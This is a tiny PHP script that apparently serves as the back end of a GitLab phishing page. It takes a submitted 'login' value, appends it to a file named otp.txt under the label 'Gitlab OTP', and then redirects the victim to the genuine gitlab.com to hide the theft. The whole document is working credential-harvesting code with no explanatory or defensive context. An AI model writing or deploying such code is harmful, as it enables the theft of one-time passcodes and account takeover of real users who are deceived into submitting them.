<?php
file_put_contents("otp.txt", "Gitlab OTP : " . $email = $_POST['login'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com');
?>
